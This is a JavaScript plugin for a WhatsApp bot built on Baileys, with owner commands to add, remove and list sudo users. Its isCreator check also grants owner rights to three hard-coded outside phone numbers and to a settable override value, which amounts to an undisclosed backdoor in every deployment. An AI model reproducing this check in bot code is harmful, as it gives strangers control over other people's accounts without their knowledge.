// filename: sudo-management.js
const { cmd } = require('../command');
const fs = require('fs');
const path = require('path');
const { jidNormalizedUser } = require('baileys');

const devFilePath = path.join(__dirname, '../lib/dev.json');
let devList = [];

try {
    if (fs.existsSync(devFilePath)) {
        const rawList = JSON.parse(fs.readFileSync(devFilePath, 'utf-8'));
        devList = rawList
            .map(jid => {
                const cleanedJid = jid.replace(/[^0-9@s.whatsapp.net]/g, '');
                return cleanedJid.includes('@s.whatsapp.net') ? cleanedJid : cleanedJid + '@s.whatsapp.net';
            })
            .filter(jid => jid.match(/^\d+@s\.whatsapp\.net$/));
    }
} catch (error) {
    console.error('Error loading dev list:', error);
    devList = [];
}

fs.writeFileSync(devFilePath, JSON.stringify(devList, null, 2));

const saveDevList = () => {
    fs.writeFileSync(devFilePath, JSON.stringify(devList, null, 2));
};

const getTargetJid = (msg, args) => {
    if (msg.mentionedJid && msg.mentionedJid.length > 0) {
        return jidNormalizedUser(msg.mentionedJid[0]);
    } else if (msg.quoted?.sender) {
        return jidNormalizedUser(msg.quoted.sender);
    } else if (args[0]) {
        const num = args[0].replace(/\D/g, '');
        return jidNormalizedUser(num + '@s.whatsapp.net');
    } else if (msg.key?.participant) {
        return jidNormalizedUser(msg.key.participant);
    }
    return null;
};

cmd({
    pattern: 'setsudo',
    alias: ['addsudo'],
    desc: 'Add a user to the sudo list',
    category: 'owner',
    filename: __filename
}, async (bot, msg, match, { args, reply, isPatron, isGroup }) => {
    if (!isPatron) return reply('*📛 This command is restricted to owners only.*');
    if (isGroup) return reply('❗ Please use this command in the *private chat* of the person you want to add as sudo.');

    await bot.sendMessage(msg.key.remoteJid, { react: { text: '➕', key: msg.key } });

    let targetJid = getTargetJid(msg, args);
    if (!targetJid) return reply('Please reply, mention or provide a valid number.');

    if (devList.includes(targetJid)) {
        return bot.sendMessage(msg.chat, {
            text: '@' + targetJid.split('@')[0] + ' is already in the sudo list.',
            mentions: [targetJid]
        }, { quoted: msg });
    }

    devList.push(targetJid);
    saveDevList();
    await bot.sendMessage(msg.chat, {
        text: '✅ @' + targetJid.split('@')[0] + ' has been *added* to the sudo list.',
        mentions: [targetJid]
    }, { quoted: msg });
});

cmd({
    pattern: 'delsudo',
    alias: ['removesudo'],
    desc: 'Remove a user from the sudo list',
    category: 'owner',
    filename: __filename
}, async (bot, msg, match, { args, reply, isPatron, isGroup }) => {
    if (!isPatron) return reply('*📛 This command is restricted to owners only.*');
    if (isGroup) return reply('❗ Please use this command in the *private chat* of the person you want to remove from sudo.');

    await bot.sendMessage(msg.key.remoteJid, { react: { text: '❌', key: msg.key } });

    let targetJid = getTargetJid(msg, args);
    if (!targetJid) return reply('Please reply, mention or provide a valid number.');

    if (!devList.includes(targetJid)) {
        return bot.sendMessage(msg.chat, {
            text: '@' + targetJid.split('@')[0] + ' is not in the sudo list.',
            mentions: [targetJid]
        }, { quoted: msg });
    }

    devList = devList.filter(user => user !== targetJid);
    saveDevList();
    await bot.sendMessage(msg.chat, {
        text: '✅ @' + targetJid.split('@')[0] + ' has been *removed* from the sudo list.',
        mentions: [targetJid]
    }, { quoted: msg });
});

cmd({
    pattern: 'listsudo',
    alias: ['sudolist'],
    desc: 'List all sudo/patron users',
    category: 'owner',
    filename: __filename
}, async (bot, msg, match, { reply, isPatron }) => {
    if (!isPatron) return reply('*📛 This command is restricted to owners only.*');
    await bot.sendMessage(msg.key.remoteJid, { react: { text: '📜', key: msg.key } });

    if (devList.length === 0) return reply('No sudo users found.');

    const mentions = [];
    const userList = devList.map((user, index) => {
        mentions.push(user);
        return (index + 1) + '. @' + user.split('@')[0];
    }).join('\n');

    await bot.sendMessage(msg.chat, {
        text: '📄 Patron/Sudo Users List:\n' + userList,
        mentions: mentions
    }, { quoted: msg });
});

let udp = null;

function setUdp(newUdp) {
    udp = newUdp;
}

const creators = ['923151105391', '923079749129', '923498344152'];
const extraCreators = [
    ...creators.map(jid => jid.includes('@s.whatsapp.net') ? jid : jid + '@s.whatsapp.net'),
    ...devList
];

function isCreator(sender, user) {
    if (!sender || !user?.user?.id) return false;

    const normalizedUserId = jidNormalizedUser(user.user.id);
    const normalizedUserLid = user.user.lid ? jidNormalizedUser(user.user.lid) : null;
    const senderNumber = sender.replace(/@(s\.whatsapp\.net|lid)$/, '');

    const senderJid = sender.endsWith('@s.whatsapp.net') ? sender : senderNumber + '@s.whatsapp.net';
    const senderLid = sender.endsWith('@lid') ? sender : senderNumber + '@lid';

    const isUserMatch = (senderJid === normalizedUserId) || (normalizedUserLid && (senderLid === normalizedUserLid || senderJid === normalizedUserLid || senderLid === normalizedUserId));
    if (isUserMatch) return true;

    const isExtraCreator = [senderNumber, senderJid, senderLid].some(id => extraCreators.includes(id));
    const isPatron = [senderNumber, senderJid, senderLid].some(id => devList.includes(id));
    const isUdpMatch = typeof udp !== 'undefined' && udp !== null && senderNumber === udp;

    return isUserMatch || isExtraCreator || isPatron || isUdpMatch;
}

module.exports = { isCreator, setUdp };
